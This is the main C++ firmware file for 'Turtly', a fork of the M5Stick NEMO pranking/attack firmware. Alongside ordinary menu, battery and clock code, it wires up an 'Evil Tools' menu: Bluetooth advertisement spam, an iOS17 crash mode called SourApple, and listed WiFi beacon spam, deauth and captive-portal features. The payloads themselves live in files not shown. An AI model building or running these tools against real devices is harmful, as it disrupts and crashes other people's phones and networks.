// Turtly Firmware for the M5 Stack Stick C Plus
// github.com/higorjardini - Fork from https://github.com/n0xa/m5stick-nemo

// -=-=-=-=-=-=- Uncomment the platform you're building for -=-=-=-=-=-=-
// #define STICK_C_PLUS
#define STICK_C_PLUS2
// #define STICK_C
// #define CARDPUTER
// -=-=- Uncommenting more than one at a time will result in errors -=-=-

// -=-=- Turtly Language for Menu and Portal
#define LANGUAGE_EN_US
// #define LANGUAGE_PT_BR
// #define LANGUAGE_IT_IT
// #define LANGUAGE_FR_FR

// -- DEPRECATED - THESE ARE NOW EEPROM DEFINED -- //
uint16_t BGCOLOR=0x0000; // placeholder
uint16_t FGCOLOR=0xFFFF; // placeholder

#if !defined(CARDPUTER) && !defined(STICK_C_PLUS2) && !defined(STICK_C_PLUS) && !defined(STICK_C)
  #define CARDPUTER
#endif

#if !defined(LANGUAGE_EN_US) && !defined(LANGUAGE_PT_BR) && !defined(LANGUAGE_IT_IT) && !defined(LANGUAGE_FR_FR)
  #define LANGUAGE_EN_US
#endif


#if defined(STICK_C_PLUS)
  #include <M5StickCPlus.h>
  // -=-=- Display -=-=-
  String platformName="StickC+";
  #define BIG_TEXT 4
  #define MEDIUM_TEXT 3
  #define SMALL_TEXT 2
  #define TINY_TEXT 1
  // -=-=- FEATURES -=-=-
  #define M5LED 10
  #define RTC
  #define AXP
  #define ACTIVE_LOW_IR
  #define ROTATION
  #define USE_EEPROM
  //#define SDCARD   //Requires a custom-built adapter
  //#define SONG

  // -=-=- ALIASES -=-=-
  #define DISP M5.Lcd
  #define IRLED 9
  #define SPEAKER M5.Beep
//  #define BITMAP M5.Lcd.drawBitmap(0, 0, 320, 240, NEMOMatrix) // This doesn't work, generates static.
  #define BITMAP Serial.println("unsupported")
  #define SD_CLK_PIN 0
  #define SD_MISO_PIN 36
  #define SD_MOSI_PIN 26
  #define SD_CS_PIN -1 //can be 14, to avoid serial messages
  #define M5LED_ON LOW
  #define M5LED_OFF HIGH
  #define POWER M5.Power
#endif

#if defined(STICK_C_PLUS2)
  #include <M5StickCPlus2.h>
  // -=-=- Display -=-=-
  String platformName="StickC+2";
  #define BIG_TEXT 4
  #define MEDIUM_TEXT 3
  #define SMALL_TEXT 2
  #define TINY_TEXT 1
  // -=-=- FEATURES -=-=-
  #define ACTIVE_LOW_IR
  #define M5LED 19
  #define ROTATION
  #define USE_EEPROM
  #define RTC      //TODO: plus2 has a BM8563 RTC but the class isn't the same, needs work.
  #define SDCARD   //Requires a custom-built adapter
  #define PWRMGMT
  #define SPEAKER M5.Speaker
  //#define SONG
  // -=-=- ALIASES -=-=-
  #define DISP M5.Lcd
  #define IRLED 19
  #define BITMAP M5.Lcd.drawBmp(NEMOMatrix, 97338)
  #define M5_BUTTON_MENU 35
  #define M5_BUTTON_HOME 37
  #define M5_BUTTON_RST 39
  #define BACKLIGHT 27
  #define MINBRIGHT 190
  #define SD_CLK_PIN 0
  #define SD_MISO_PIN 36
  #define SD_MOSI_PIN 26
  #define SD_CS_PIN 14 //can be -1, but sends a lot of messages of error in serial monitor
  #define M5LED_ON HIGH
  #define M5LED_OFF LOW
  #define POWER M5.Power
#endif

#if defined(STICK_C)
  #include <M5StickC.h>
  // -=-=- Display -=-=-
  String platformName="StickC";
  #define BIG_TEXT 2
  #define MEDIUM_TEXT 2
  #define SMALL_TEXT 1
  #define TINY_TEXT 1
  // -=-=- FEATURES -=-=-
  #define M5LED 10
  #define RTC
  #define AXP
  #define ROTATION
  #define USE_EEPROM
  #define SDCARD   //Requires a custom-built adapter
  //#define SONG
  // -=-=- ALIASES -=-=-
  #define DISP M5.Lcd
  #define IRLED 9
  #define BITMAP Serial.println("unsupported")
  #define SD_CLK_PIN 0
  #define SD_MISO_PIN 36
  #define SD_MOSI_PIN 26
  #define SD_CS_PIN -1 //can be 14, to avoid serial messages
  #define M5LED_ON LOW
  #define M5LED_OFF HIGH
  #define POWER M5.Power
#endif

#if defined(CARDPUTER)
  #include <M5Cardputer.h>
  // -=-=- Display -=-=-
  String platformName="Cardputer";
  #define BIG_TEXT 4
  #define MEDIUM_TEXT 3
  #define SMALL_TEXT 2
  #define TINY_TEXT 1
  // -=-=- FEATURES -=-=-
  #define KB
  #define HID
  #define ACTIVE_LOW_IR
  #define USE_EEPROM
  #define SDCARD
  //#define SONG
  // -=-=- ALIASES -=-=-
  #define DISP M5Cardputer.Display
  #define IRLED 44
  #define BACKLIGHT 38
  #define MINBRIGHT 165
  #define SPEAKER M5Cardputer.Speaker
  #define BITMAP M5Cardputer.Display.drawBmp(NEMOMatrix, 97338)
  #define SD_CLK_PIN 40
  #define SD_MISO_PIN 39
  #define SD_MOSI_PIN 14
  #define SD_CS_PIN 12
  #define VBAT_PIN 10
  #define M5LED_ON LOW
  #define M5LED_OFF HIGH
  #define POWER M5Cardputer.Power
#endif

// -=-=-=-=-=- LIST OF CURRENTLY DEFINED FEATURES -=-=-=-=-=-
// M5LED      - A visible LED (Red) exposed on this pin number
// IRLED      - An IR LED exposed on this pin number
// RTC        - Real-time clock exposed as M5.Rtc 
// AXP        - AXP192 Power Management exposed as M5.Axp
// PWRMGMT    - StickC+2 Power Management exposed as M5.Power
// KB         - Keyboard exposed as M5Cardputer.Keyboard
// HID        - HID exposed as USBHIDKeyboard
// USE_EEPROM - Store settings in EEPROM
// ROTATION   - Allow screen to be rotated
// DISP       - Set to the API's Display class
// SDCARD     - Device has an SD Card Reader attached
// SONG       - Play melody or beep on startup
// SPEAKER    - Aliased to the prefix used for making noise
// BACKLIGHT  - Alias to the pin used for the backlight on some models
// MINBRIGHT  - The lowest number (0-255) for the backlight to show through

/// SWITCHER ///
// Proc codes
// 0  - Clock
// 1  - Main Menu
// 2  - Settings Menu
// 3  - Clock set
// 4  - Dimmer Time adjustment
// 5  - TV B-GONE
// 6  - Battery info
// 7  - screen rotation
// 8  - AppleJuice Menu
// 9  - AppleJuice Advertisement
// 10 - Credits
// 11 - Wifi beacon spam
// 12 - Wifi tools menu
// 13 - TV-B-Gone Region Setting
// 14 - Wifi scanning
// 15 - Wifi scan results
// 16 - Bluetooth Spam Menu
// 17 - Bluetooth Maelstrom
// 18 - QR Codes
// 19 - NEMO Portal
// 20 - Attack menu
// 21 - Deauth Attack
// 22 - Custom Color Settings
// 23 - Pre-defined color themes
// .. - ..
// 97 - Mount/UnMount SD Card on M5Stick devices, if SDCARD is declared

const String contributors[] PROGMEM = {
  "@bicurico",
  "@bmorcelli",
  "@chr0m1ng",
  "@doflamingozk",
  "@9Ri7",
  "@gustavocelani",
  "@higorjardini",
  "@imxnoobx",
  "@klamath1977",
  "@marivaaldo",
  "@mmatuda",
  "@n0xa",
  "@niximkk",
  "@vladimirpetrov",
  "@vs4vijay"
};

int advtime = 0; 
int cursor = 0;
int wifict = 0;
int brightness = 100;
int ajDelay = 1000;
int apSsidOffset = 16;
int apSsidMaxLen = 32;
int batteryState = NULL;
int batteryRefresh = 0;
int batteryPositionX = NULL;
bool batteryDisplayClear = false;
bool rstOverride = false;   // Reset Button Override. Set to true when navigating menus.
bool sourApple = false;     // Internal flag to place AppleJuice into SourApple iOS17 Exploit Mode
bool swiftPair = false;     // Internal flag to place AppleJuice into Swift Pair random packet Mode
bool androidPair = false;   // Internal flag to place AppleJuice into Android Pair random packet Mode
bool maelstrom = false;     // Internal flag to place AppleJuice into Bluetooth Maelstrom mode
bool portal_active = false; // Internal flag used to ensure NEMO Portal exits cleanly
bool activeQR = false; 
const byte PortalTickTimer = 1000;
String apSsidName = String("");
bool isSwitching = true;
#if defined(RTC)
  int current_proc = 8; // Start in Clock Mode
#else
  int current_proc = 1; // Start in Main Menu mode if no RTC
#endif

// Import Languages
#include "src/languages/language.h"
// Import Tools
#include "src/tools/bluetooth/applejuice.h"
#include "src/tools/bluetooth/wifispam.h"

struct MENU {
  char name[19];
  int command;
};

struct QRCODE {
  char name[19];
  String url;
};

QRCODE qrcodes[] = {
  { TXT_BACK, "" },
  { "higorjardini.dev", "https://www.higorjardini.dev"},\
  { "BIGGER", "https://youtu.be/VtJUHGjVm0E?si=yeUd3klQSIvfsTyM"},
  { "Nemo", "https://www.youtube.com/watch?v=SPHfeNgogVs"},
};

void drawmenu(MENU thismenu[], int size) {
  DISP.setTextSize(SMALL_TEXT);
  DISP.fillScreen(BGCOLOR);
  DISP.setCursor(0, 28, 1);
  // scrolling menu
  if (cursor < 0) {
    cursor = size - 1;  // rollover hack for up-arrow on cardputer
  }
  if (cursor > 5) {
    for ( int i = 0 + (cursor - 5) ; i < size ; i++ ) {
      if(cursor == i){
        DISP.setTextColor(BGCOLOR, FGCOLOR);
      }
      DISP.printf(" %-19s\n",thismenu[i].name);
      DISP.setTextColor(FGCOLOR, BGCOLOR);
    }
  } else {
    for (
      int i = 0 ; i < size ; i++ ) {
      if(cursor == i){
        DISP.setTextColor(BGCOLOR, FGCOLOR);
      }
      DISP.printf(" %-19s\n",thismenu[i].name);
      DISP.setTextColor(FGCOLOR, BGCOLOR);
    }
  }
}

void number_drawmenu(int nums) {
  DISP.setTextSize(SMALL_TEXT);
  DISP.fillScreen(BGCOLOR);
  DISP.setCursor(0, 0);
  // scrolling menu
  if (cursor > 5) {
    for ( int i = 0 + (cursor - 5) ; i < nums ; i++ ) {
      if(cursor == i){
        DISP.setTextColor(BGCOLOR, FGCOLOR);
      }
      DISP.printf(" %-19d\n",i);
      DISP.setTextColor(FGCOLOR, BGCOLOR);
    }
  } else {
    for (
      int i = 0 ; i < nums ; i++ ) {
      if(cursor == i){
        DISP.setTextColor(BGCOLOR, FGCOLOR);
      }
      DISP.printf(" %-19d\n",i);
      DISP.setTextColor(FGCOLOR, BGCOLOR);
    }
  }
}

void switcher_button_proc() {
  if (rstOverride == false) {
    if (check_next_press()) {
      isSwitching = true;
      current_proc = 1;
    }
  }
}

// Tap the power button from pretty much anywhere to get to the main menu
void check_menu_press() {
  #if defined(AXP)
    if (M5.Axp.GetBtnPress()) {
  #endif
  #if defined(KB)
    if (M5Cardputer.Keyboard.isKeyPressed(',') || M5Cardputer.Keyboard.isKeyPressed('`')){
  #endif
  #if defined(M5_BUTTON_MENU)
    if (digitalRead(M5_BUTTON_MENU) == LOW){
  #endif
    dimtimer();
    isSwitching = true;
    rstOverride = false;
    current_proc = 1;
    delay(100);
  }
}

bool check_next_press(){
  #if defined(KB)
    M5Cardputer.update();
    if (M5Cardputer.Keyboard.isKeyPressed(';')){
      // hack to handle the up arrow
      cursor = cursor - 2;
      dimtimer();
      return true;
    }
    //M5Cardputer.update();
    if (M5Cardputer.Keyboard.isKeyPressed(KEY_TAB) || M5Cardputer.Keyboard.isKeyPressed('.')){
      dimtimer();
      return true;
    }
  #else
    if (digitalRead(M5_BUTTON_RST) == LOW){
      dimtimer();
      return true;
    }
  #endif
  return false;
}

bool check_select_press(){
  #if defined(KB)
    M5Cardputer.update();
    if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER) || M5Cardputer.Keyboard.isKeyPressed('/')){
      dimtimer();
      return true;
    }
  #else
    if (digitalRead(M5_BUTTON_HOME) == LOW){
      dimtimer();
      return true;
    }
  #endif
  return false;
}

/// MAIN MENU ///
MENU mmenu[] = {
  { TXT_EVIL_TOOLS, 9},
  { TXT_UTILITIES, 7},
  { TXT_SETTINGS, 2},
};
int mmenu_size = sizeof(mmenu) / sizeof(MENU);

void mmenu_setup() {
  cursor = 0;
  rstOverride = true;
  drawmenu(mmenu, mmenu_size);
  delay(500); // Prevent switching after menu loads up
}

void mmenu_loop() {
  battery_show(false, 5000);
  clock_show();
  if (check_next_press()) {
    cursor++;
    cursor = cursor % mmenu_size;
    drawmenu(mmenu, mmenu_size);
    delay(250);
  }
  if (check_select_press()) {
    rstOverride = false;
    isSwitching = true;
    current_proc = mmenu[cursor].command;
  }
}

bool screen_dim_dimmed = false;
int screen_dim_time = 30;
int screen_dim_current = 0;

void screenBrightness(int bright){
  Serial.printf("Brightness: %d\n", bright);
  #if defined(AXP)
    M5.Axp.ScreenBreath(10 + round(((100 - 10) * bright / 100)));
  #endif
  #if defined(BACKLIGHT)
    int bl = MINBRIGHT + round(((255 - MINBRIGHT) * bright / 100)); 
    analogWrite(BACKLIGHT, bl);
  #endif
}

int uptime(){
  return(int(millis() / 1000));
}

void dimtimer(){
  if(screen_dim_dimmed){
    screenBrightness(brightness);
    screen_dim_dimmed = false;
  }
  screen_dim_current = uptime() + screen_dim_time + 2;
}

void screen_dim_proc() {
  if(screen_dim_time > 0){
    if (screen_dim_dimmed == false) {
      if (uptime() == screen_dim_current || (uptime() + 1) == screen_dim_current || (uptime() + 2) == screen_dim_current) {
        screenBrightness(0);
        screen_dim_dimmed = true;
      }
    }
  }
}

void qrmenu_drawmenu() {
  DISP.setTextSize(SMALL_TEXT);
  DISP.fillScreen(BGCOLOR);
  DISP.setCursor(0, 8, 1);
  for ( int i = 0 ; i < ( sizeof(qrcodes) / sizeof(QRCODE) ) ; i++ ) {
    DISP.print((cursor == i) ? ">" : " ");
    DISP.println(qrcodes[i].name);
  }
}

void qrmenu_setup() {
  cursor = 0;
  rstOverride = true;
  qrmenu_drawmenu();
  delay(500); // Prevent switching after menu loads up
}

void qrmenu_loop() {
  if (check_next_press()) {
    cursor++;
    cursor = cursor % ( sizeof(qrcodes) / sizeof(QRCODE) );
    qrmenu_drawmenu();
    activeQR = false;
    delay(250);
  }
  if (check_select_press()) {
    if (qrcodes[cursor].url.length() < 1){
      current_proc = 1;
      isSwitching = true;
    }else if ( activeQR == false ) {
      activeQR = true;
      DISP.fillScreen(WHITE);
      DISP.qrcode(qrcodes[cursor].url, (DISP.width() - DISP.height()) / 2, 0, DISP.height(), 5);
      delay(500);
    } else {
      isSwitching = true;
      activeQR = false;
      delay(250);
    }
  }
}

/// ENTRY ///
void setup() {
  #if defined(CARDPUTER)
    auto cfg = M5.config();
    M5Cardputer.begin(cfg, true);
  #else
    M5.begin();
  #endif
  #if defined(BACKLIGHT)
    pinMode(BACKLIGHT, OUTPUT); // Backlight analogWrite range ~150 - 255
  #endif
  if(check_next_press()){
    clearSettings();
  }
  
  // Pin setup
  #if defined(M5LED)
    pinMode(M5LED, OUTPUT);
    digitalWrite(M5LED, M5LED_OFF); //LEDOFF
  #endif
  #if defined(IRLED)
    pinMode(IRLED, OUTPUT);
    digitalWrite(IRLED, M5LED_OFF); //LEDOFF
  #endif
  #if !defined(KB)
    pinMode(M5_BUTTON_HOME, INPUT);
    pinMode(M5_BUTTON_RST, INPUT);
  #endif
  #if defined(M5_BUTTON_MENU)
    pinMode(M5_BUTTON_MENU, INPUT);
  #endif
    // Random seed
    randomSeed(analogRead(0));

  // Create the BLE Server - Need to Working AppleJuice
  BLEDevice::init("");
  BLEServer *pServer = BLEDevice::createServer();
  pAdvertising = pServer->getAdvertising();
  BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();

  screenBrightness(brightness);
  dimtimer();
  DISP.setRotation(1);
  DISP.setTextColor(FGCOLOR, BGCOLOR);
  bootScreen();
}

/// SETTINGS MENU ///
MENU smenu[] = {
  { TXT_BACK, 1},
#if defined(AXP) || defined(PWRMGMT)
  { TXT_BATT_INFO, 5},
#endif
#if defined(CARDPUTER)
  { TXT_BATT_INFO, 5},
#endif
#if defined(ROTATION)
  { TXT_ROTATION, 6},
#endif
  { TXT_ABOUT, 3},
  { TXT_REBOOT, 98},
  { TXT_POWER_OFF, 99},
};

int smenu_size = sizeof(smenu) / sizeof (MENU);

void smenu_setup() {
  cursor = 0;
  rstOverride = true;
  drawmenu(smenu, smenu_size);
  delay(500); // Prevent switching after menu loads up
}

void clearSettings(){
  screenBrightness(100);
  DISP.fillScreen(BLUE);
  DISP.setTextSize(BIG_TEXT);
  DISP.setRotation(1);
  DISP.setTextColor(BLUE, WHITE);
  DISP.setCursor(40, 0);
  DISP.println("M5-NEMO");
  DISP.setTextColor(WHITE, BLUE);
  DISP.setTextSize(SMALL_TEXT);
  DISP.println(TXT_CLRING_SETTINGS);
  delay(5000);
  ESP.restart();
}

void smenu_loop() {
  battery_show(false, 5000);
  clock_show();
  if (check_next_press()) {
    cursor++;
    cursor = cursor % smenu_size;
    drawmenu(smenu, smenu_size);
    delay(250);
  }
  if (check_select_press()) {
    rstOverride = false;
    isSwitching = true;
    if(smenu[cursor].command == 98){
      ESP.restart();
    }
    if(smenu[cursor].command == 99){
      M5.Power.powerOff();
    }
    current_proc = smenu[cursor].command;
  }
}

/// CREDITS ///
void credits_setup(){
  DISP.setFreeFont(&fonts::Font0);
  DISP.fillScreen(WHITE);
  DISP.qrcode("https://github.com/HigorJardini/Turtly", 145, 22, 100, 5);
  DISP.setTextColor(BLACK, WHITE);
  DISP.setTextSize(MEDIUM_TEXT);
  DISP.setCursor(0, 10);
  DISP.print(" Turtly\n");
  DISP.setTextSize(SMALL_TEXT);
  DISP.printf(" %s\n\n", platformName);
  DISP.println("Contributors:");
  DISP.setCursor(155, 5);
  DISP.println("GitHub");
  DISP.setCursor(155, 17);
  DISP.println("Source:");
  delay(250);
  cursor = 0;
  advtime = 0;
}

void credits_loop(){
  if(millis() > advtime){
    DISP.setTextColor(BLACK, WHITE);  
    DISP.setCursor(0, 115);
    DISP.println("                   ");
    DISP.setCursor(0, 115);
    DISP.println(contributors[cursor]);
    cursor++;  
    cursor = cursor % (sizeof(contributors)/sizeof(contributors[0]));
    DISP.setTextColor(FGCOLOR, BGCOLOR);
    advtime=millis() + 2000;
  }
}

int rotation = 1;
#if defined(ROTATION)
  /// Rotation MENU ///
  MENU rmenu[] = {
    { TXT_BACK, rotation},
    { TXT_RIGHT, 1},
    { TXT_LEFT, 3},
  };
  int rmenu_size = sizeof(rmenu) / sizeof (MENU);

  void rmenu_setup() {
    cursor = 0;
    rstOverride = true;
    drawmenu(rmenu, rmenu_size);
    delay(500); // Prevent switching after menu loads up
  }

  void rmenu_loop() {
    battery_show(false, 5000);
    clock_show();
    if (check_next_press()) {
      cursor++;
      cursor = cursor % rmenu_size;
      drawmenu(rmenu, rmenu_size);
      delay(250);
    }
    if (check_select_press()) {
      rstOverride = false;
      isSwitching = true;
      rotation = rmenu[cursor].command;
      DISP.setRotation(rotation);
      current_proc = 2;
    }
  }
#endif //ROTATION

/// BATTERY INFO ///

#if defined(PWRMGMT)
  int old_battery = 0;

  void battery_drawmenu(int battery) {
    DISP.setTextColor(FGCOLOR,BGCOLOR);
    DISP.setTextSize(SMALL_TEXT);
    DISP.fillScreen(BGCOLOR);
    DISP.setCursor(0, 8, 1);
    DISP.print(TXT_BATT);
    battery_color(battery);
    DISP.print(battery);
    DISP.println("%");
    DISP.setTextColor(FGCOLOR,BGCOLOR);
    DISP.println(TXT_EXIT);
  }

  int get_battery_voltage() {
    return POWER.getBatteryLevel();
  }

  void battery_setup() {
    int battery = get_battery_voltage();
    battery_drawmenu(battery);
    delay(500); // Prevent switching after menu loads up
  }

  void battery_loop() {
    delay(300);
    int battery = get_battery_voltage();

    if (battery != old_battery){
      battery_drawmenu(battery);
    }
    if (check_select_press()) {
      isSwitching = true;
      current_proc = 1;
    }
    old_battery = battery;
  }

  int get_battery(int timer)
	{
    int battery = get_battery_voltage();
    return battery_options(battery, timer);
	}

  String get_battery_str(int battery)
    {
      if (battery == -1)
        return "...";

      return String(battery) + "%";
  }
#endif

#ifdef AXP
  int old_battery=0;
  void battery_drawmenu(int battery, int b, int c) {
    DISP.setTextColor(FGCOLOR,BGCOLOR);
    DISP.setTextSize(SMALL_TEXT);
    DISP.fillScreen(BGCOLOR);
    DISP.setCursor(0, 8, 1);
    DISP.print(TXT_BATT);
    battery_color(battery);
    DISP.print(battery);
    DISP.println("%");
    DISP.setTextColor(FGCOLOR,BGCOLOR);
    DISP.print("DeltaB: ");
    DISP.println(b);
    DISP.print("DeltaC: ");
    DISP.println(c);
    DISP.println("");
    DISP.println(TXT_EXIT);
  }

  void battery_setup() {
    rstOverride = false;
    float c = M5.Axp.GetVapsData() * 1.4 / 1000;
    float b = M5.Axp.GetVbatData() * 1.1 / 1000;
    int battery = ((b - 3.0) / 1.2) * 100;
    battery_drawmenu(battery, b, c);
    delay(500); // Prevent switching after menu loads up
  }

  void battery_loop() {
    delay(300);
    float c = M5.Axp.GetVapsData() * 1.4 / 1000;
    float b = M5.Axp.GetVbatData() * 1.1 / 1000;
    int battery = ((b - 3.0) / 1.2) * 100;
    if (battery != old_battery){
      battery_drawmenu(battery, b, c);
    }
    if (check_select_press()) {
      rstOverride = false;
      isSwitching = true;
      current_proc = 1;
    }
    old_battery = battery;
  }

  int get_battery(int timer)
	{
    float c = M5.Axp.GetVapsData() * 1.4 / 1000;
    float b = M5.Axp.GetVbatData() * 1.1 / 1000;
    int battery = ((b - 3.0) / 1.2) * 100;

    return battery_options(battery, timer);
	}

  String get_battery_str(int battery)
    {
      if (battery == -1)
        return "...";

      return String(battery) + "%";
  }
#endif // AXP

#if defined(CARDPUTER)
  /// BATTERY INFO ///
  uint8_t oldBattery = 0;
  void battery_drawmenu(uint8_t battery) {
    // Battery bar color definition
    uint16_t batteryBarColor = BLUE;
    if(battery < 20) {
      batteryBarColor = RED;
    } else if(battery < 60) {
      batteryBarColor = ORANGE;
    } else {
      batteryBarColor = GREEN;
    }
    // Battery bar
    DISP.fillScreen(BGCOLOR);
    DISP.drawRect(10, 10, 220, 100, batteryBarColor);
    DISP.fillRect(10, 10, (220 * battery / 100), 100, batteryBarColor);
    // Battery percentage
    DISP.setTextColor(WHITE);
    DISP.setTextSize(BIG_TEXT);
    DISP.setCursor(80, 45, 1);
    battery_color(battery);
    DISP.print(battery);
    DISP.println("%");
    // Exit text
    DISP.setCursor(10, 120, 1);
    DISP.setTextSize(TINY_TEXT);
    DISP.println(TXT_EXIT);
    DISP.setTextColor(FGCOLOR, BGCOLOR);
  }

  void battery_setup() {
    rstOverride = false;
    pinMode(VBAT_PIN, INPUT);
    uint8_t battery = ((((analogRead(VBAT_PIN)) - 1842) * 100) / 738);
    battery_drawmenu(battery);
    delay(500); // Prevent switching after menu loads up
    /*
      Used minimum 3,0V and maximum 4,2V for battery. So it may show wrong values. Needs testing.
      It only shows decent values when disconnected from charger, due to HW limitations.
      Equation: Bat% = ((Vadc - 1842) / (2580 - 1842)) * 100. Where: 4,2V = 2580, 3,0V = 1842.
    */
  }

  void battery_loop() {
    // Read 30 battery values to calculate the average (avoiding unprecise and close values)
    uint16_t batteryValues = 0;
    for(uint8_t i = 0; i < 30; i++) { // 30 iterations X 100ms = 3 seconds for each refresh
      delay(100);
      batteryValues += ((((analogRead(VBAT_PIN)) - 1842) * 100) / 738);
      M5Cardputer.update();
      if(M5Cardputer.Keyboard.isChange() && M5Cardputer.Keyboard.isPressed()) { // If any key is pressed
        rstOverride = false;
        isSwitching = true;
        current_proc = 1;
        break;
      }
    }

    if(!isSwitching) { // If is not switching, calculate battery average
      uint8_t battery = batteryValues / 30; // Iteration times
      Serial.printf("Battery Level: %d\n", battery);
      if(battery != oldBattery) { // Only draw a new screen if value is different
        oldBattery = battery;
        battery_drawmenu(battery);
      }
    }

    int get_battery(int timer)
    {
      uint8_t battery = ((((analogRead(VBAT_PIN)) - 1842) * 100) / 738);
      return battery_options(battery, timer);
    }

    String get_battery_str(int battery)
      {
        if (battery == -1)
          return "...";

        return String(battery) + "%";
    }
}
#endif // Cardputer

void battery_show(bool clear, int timer) {
  int battery = get_battery(timer);
  
  battery_color(battery);

  if (battery < 100) {
    batteryPositionX = 30;
    if(batteryDisplayClear == true && clear == true){
      DISP.clearDisplay();
      batteryDisplayClear = false;
    }
  }
  else {
    batteryPositionX = 35;
  }

  DISP.setCursor(DISP.width() - batteryPositionX, 6);
  DISP.setFreeFont(&fonts::Font2);
  DISP.setTextSize(1);
  DISP.println(get_battery_str(battery));
  DISP.setTextColor(FGCOLOR, BGCOLOR);

  // DISP.drawString(get_battery_str(battery), DISP.width() - batteryPositionX, 10, 2);
}

int battery_options(int battery, int timer){
  if(batteryRefresh > timer || batteryState == NULL) {
    if(((battery < batteryState || batteryState == NULL) || POWER.isCharging())) {
      if(batteryState == 100 && battery < 100) {
        batteryDisplayClear = true;
      }
      batteryState = battery;
      batteryRefresh = 0;
    } else {
      batteryRefresh++; 
    }
  } else {
    batteryRefresh++;
  }
  
  return batteryState;
}

void battery_color(int battery) {

  if (battery > 50)
    DISP.setTextColor(GREEN, BLACK);
  else if (battery > 25)
    DISP.setTextColor(YELLOW, BLACK);
  else
    DISP.setTextColor(RED, BLACK);

}

/// UTILITIES MENU ///
MENU utmenu[] = {
  { TXT_BACK, 1},
  #if defined(RTC)
    { TXT_CLOCK, 8},
  #endif
  { "QrCodes", 4},
};
int utmenu_size = sizeof(utmenu) / sizeof (MENU);

void utmenu_setup() {
  cursor = 0;
  rstOverride = true;
  drawmenu(utmenu, utmenu_size);
  delay(500); // Prevent switching after menu loads up
}

void utmenu_loop() {
  battery_show(false, 5000);
  clock_show();
  if (check_next_press()) {
    cursor++;
    cursor = cursor % utmenu_size;
    drawmenu(utmenu, utmenu_size);
    delay(250);
  }
  if (check_select_press()) {
    rstOverride = false;
    isSwitching = true;
    current_proc = utmenu[cursor].command;
  }
}

/// EVIL TOOLS MENU ///
MENU emenu[] = {
  { TXT_BACK, 1},
  { "Bluetooth", 10},
  
};
int emenu_size = sizeof(emenu) / sizeof (MENU);

void emenu_setup() {
  cursor = 0;
  rstOverride = true;
  drawmenu(emenu, emenu_size);
  delay(500); // Prevent switching after menu loads up
}

void emenu_loop() {
  battery_show(false, 5000);
  clock_show();
  if (check_next_press()) {
    cursor++;
    cursor = cursor % emenu_size;
    drawmenu(emenu, emenu_size);
    delay(250);
  }
  if (check_select_press()) {
    rstOverride = false;
    isSwitching = true;
    current_proc = emenu[cursor].command;
  }
}

/// CLOCK ///

#if defined(RTC)
  void clock_setup() {
    DISP.fillScreen(BGCOLOR);
    DISP.setTextSize(1);
  }

  void clock_loop() {
    battery_show(true, 2000);
    DISP.setCursor(10, 40, 7);
    #if defined(STICK_C_PLUS2)
      auto dt = StickCP2.Rtc.getDateTime();
      DISP.printf("%02d:%02d:%02d\n", dt.time.hours, dt.time.minutes, dt.time.seconds);
    #else
      M5.Rtc.GetBm8563Time();
      DISP.printf("%02d:%02d:%02d\n", M5.Rtc.Hour, M5.Rtc.Minute, M5.Rtc.Second);
    #endif
    check_select_press();
  }

  void clock_show() {
    DISP.setCursor(10, 6);
    DISP.setFreeFont(&fonts::Font2);
    DISP.setTextSize(1.1);
    #if defined(STICK_C_PLUS2)
      auto dt = StickCP2.Rtc.getDateTime();
      DISP.printf("%02d:%02d\n", dt.time.hours, dt.time.minutes);
    #else
      M5.Rtc.GetBm8563Time();
      DISP.printf("%02d:%02d\n", M5.Rtc.Hour, M5.Rtc.Minute);
    #endif
  }
#endif // RTC

/// Bluetooth Spamming ///
/// BTSPAM MENU ///
MENU btmenu[] = {
  { TXT_BACK, 5},
  { "AppleJuice", 0},
  { "Swift Pair", 1},
  { "Android Spam", 4},
  { TXT_SA_CRASH, 2},
  { "BT Maelstrom", 3},
};
int btmenu_size = sizeof(btmenu) / sizeof (MENU);

void btmenu_setup() {
  cursor = 0;
  sourApple = false;
  swiftPair = false;
  maelstrom = false;
  androidPair = false;
  rstOverride = true;
  drawmenu(btmenu, btmenu_size);
  delay(500); // Prevent switching after menu loads up
}

void btmenu_loop() {
  if (check_next_press()) {
    cursor++;
    cursor = cursor % btmenu_size;
    drawmenu(btmenu, btmenu_size);
    delay(250);
  }
  if (check_select_press()) {
    int option = btmenu[cursor].command;
    DISP.fillScreen(BGCOLOR);
    DISP.setTextSize(MEDIUM_TEXT);
    DISP.setCursor(0, 0);
    DISP.setTextColor(BGCOLOR, FGCOLOR);
    DISP.printf(" %-12s\n", TXT_BT_SPAM);
    DISP.setTextColor(FGCOLOR, BGCOLOR);
    DISP.setTextSize(SMALL_TEXT);
    DISP.print(TXT_ADV);

    switch(option) {
      case 0:
        DISP.fillScreen(BGCOLOR);
        rstOverride = false;
        isSwitching = true;
        current_proc = 11;
        break;
      case 1:
        swiftPair = true;
        current_proc = 12; // jump straight to appleJuice Advertisement
        rstOverride = false;
        isSwitching = true;
        DISP.print(TXT_SP_RND);
        DISP.print(TXT_SEL_EXIT2);
        break;
      case 2:
        sourApple = true;
        current_proc = 12; // jump straight to appleJuice Advertisement
        rstOverride = false;
        isSwitching = true;
        DISP.print(TXT_SA_CRASH);
        DISP.print(TXT_SEL_EXIT2);
        break;
      case 3:
        rstOverride = false;
        isSwitching = true;
        current_proc = 13; // Maelstrom
        DISP.print("Bluetooth Maelstrom\n");
        DISP.print(TXT_CMB_BT_SPAM);
        DISP.print(TXT_SEL_EXIT2);
        break;
      case 4:
        androidPair = true;
        current_proc = 12; // jump straight to appleJuice Advertisement
        rstOverride = false;
        isSwitching = true;
        DISP.print(TXT_AD_SPAM);
        DISP.print(TXT_SEL_EXIT2);
        break;

      case 5:
        DISP.fillScreen(BGCOLOR);
        rstOverride = false;
        isSwitching = true;
        current_proc = 9;
        break;
    }
  }
}

MENU ajmenu[] = {
  { TXT_BACK, 30},
  { "AirPods", 1},
  { TXT_AJ_TRANSF_NM, 27},
  { "AirPods Pro", 2},
  { "AirPods Max", 3},
  { "AirPods G2", 4},
  { "AirPods G3", 5},
  { "AirPods Pro G2", 6},
  { "PowerBeats", 7},
  { "PowerBeats Pro", 8},
  { "Beats Solo Pro", 9},
  { "Beats Studio Buds", 10},
  { "Beats Flex", 11},
  { "Beats X", 12},
  { "Beats Solo 3", 13},
  { "Beats Studio 3", 14},
  { "Beats Studio Pro", 15},
  { "Beats Fit Pro", 16},
  { "Beats Studio Buds+", 17},
  { "Apple Vision Pro", 29},
  { "AppleTV Setup", 18},
  { "AppleTV Pair", 19},
